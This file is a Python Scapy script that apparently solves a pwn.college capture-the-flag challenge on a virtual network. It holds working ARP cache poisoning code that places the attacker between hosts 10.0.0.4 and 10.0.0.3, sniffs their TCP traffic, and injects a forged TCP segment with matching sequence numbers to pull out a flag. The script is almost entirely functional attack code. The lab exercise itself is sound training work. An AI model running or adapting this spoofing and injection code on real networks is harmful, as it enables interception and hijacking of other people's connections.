from scapy.all import *


"""
In this series of challenges, you will be working within a virtual network in order to intercept networked traffic.
In this challenge you will man in the middle traffic between two remote hosts and inject extra traffic.
The remote host at `10.0.0.4` is communicating with the remote host at `10.0.0.3` on port `31337`.

>>> ls(Ether())
dst        : DestMACField                        = 'None (resolved on build)' ('None')
src        : SourceMACField                      = '00:00:00:00:00:00' ('None')
type       : XShortEnumField                     = 36864           ('36864')
>>> ls(IP())
version    : BitField  (4 bits)                  = 4               ('4')
ihl        : BitField  (4 bits)                  = None            ('None')
tos        : XByteField                          = 0               ('0')
len        : ShortField                          = None            ('None')
id         : ShortField                          = 1               ('1')
flags      : FlagsField                          = <Flag 0 ()>     ('<Flag 0 ()>')
frag       : BitField  (13 bits)                 = 0               ('0')
ttl        : ByteField                           = 64              ('64')
proto      : ByteEnumField                       = 0               ('0')
chksum     : XShortField                         = None            ('None')
src        : SourceIPField                       = '127.0.0.1'     ('None')
dst        : DestIPField                         = '127.0.0.1'     ('None')
options    : PacketListField                     = []              ('[]')
>>> ls(TCP())
sport      : ShortEnumField                      = 20              ('20')
dport      : ShortEnumField                      = 80              ('80')
seq        : IntField                            = 0               ('0')
ack        : IntField                            = 0               ('0')
dataofs    : BitField  (4 bits)                  = None            ('None')
reserved   : BitField  (3 bits)                  = 0               ('0')
flags      : FlagsField                          = <Flag 2 (S)>    ('<Flag 2 (S)>')
window     : ShortField                          = 8192            ('8192')
chksum     : XShortField                         = None            ('None')
urgptr     : ShortField                          = 0               ('0')
options    : TCPOptionsField                     = []              ("b''")
>>> ls(ARP())
hwtype     : XShortEnumField                     = 1               ('1')
ptype      : XShortEnumField                     = 2048            ('2048')
hwlen      : FieldLenField                       = None            ('None')
plen       : FieldLenField                       = None            ('None')
op         : ShortEnumField                      = 1               ('1')
hwsrc      : MultipleTypeField (SourceMACField, StrFixedLenField) = '00:00:00:00:00:00' ('None')
psrc       : MultipleTypeField (SourceIPField, SourceIP6Field, StrFixedLenField) = '0.0.0.0'       ('None')
hwdst      : MultipleTypeField (MACField, StrFixedLenField) = '00:00:00:00:00:00' ('None')
pdst       : MultipleTypeField (IPField, IP6Field, StrFixedLenField) = '0.0.0.0'       ('None')
"""

def who_has(ip):
	src_mac =  get_if_hwaddr("eth0")
	arp = Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff", type="ARP")/ARP(op="who-has", hwsrc=src_mac, psrc="10.0.0.2", pdst=ip)
	response = srp1(arp, timeout=3, iface="eth0", verbose=False)
	return response.hwsrc if response else None

def is_at(dst_mac, dst_ip, ip):
	# no return since not reply expected
	src_mac =  get_if_hwaddr("eth0")
	arp = Ether(src=src_mac, dst=dst_mac, type="ARP")/ARP(op="is-at", hwsrc=src_mac, psrc=ip, hwdst=dst_mac, pdst=dst_ip)
	response = srp1(arp, timeout=3, iface="eth0")

def inject_flag_request(packet):
	# we do not have to forward the packets we intercept to the target dst since this happens due to ip forwarding enabled
	if packet["Ether"].src != src_mac and Raw in packet and packet["Raw"].load == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
		print(f"{packet['Ether'].src} {packet['IP'].src} -> {packet['Ether'].dst} {packet['IP'].dst} {packet['TCP'].flags} {packet['TCP'].seq} {packet['TCP'].ack} {packet['Raw'].load}")
		flag_packet = Ether(src=src_mac, dst=packet["Ether"].src)/IP(src=packet["IP"].dst, dst=packet["IP"].src)
		flag_packet = flag_packet/TCP(sport=packet["TCP"].dport, dport=packet["TCP"].sport, seq=packet["TCP"].ack, ack=packet["TCP"].seq+len(packet["Raw"].load), flags="PA")/b"FLAG\n"
		sendp(flag_packet, iface="eth0", verbose=False)
		return False
	if Raw in packet and packet["Raw"].load[:12] == b'pwn.college{':
		print(f"{packet['IP'].src} -> {packet['IP'].dst} {packet['TCP'].flags} {packet['Raw'].load}")
		return True
	else:
		print(f"{packet['IP'].src} -> {packet['IP'].dst} {packet['TCP'].flags} {packet['Raw'].load if Raw in packet else ''}")
		return False

src_mac =  get_if_hwaddr("eth0")
client_ip = "10.0.0.4"
server_ip = "10.0.0.3"
client = who_has(client_ip)
server = who_has(server_ip)
print(f"Client {client}, Server {server}")

is_at(client, client_ip, server_ip)
is_at(server, server_ip, client_ip)

sniff(iface="eth0", filter="tcp", stop_filter=inject_flag_request)
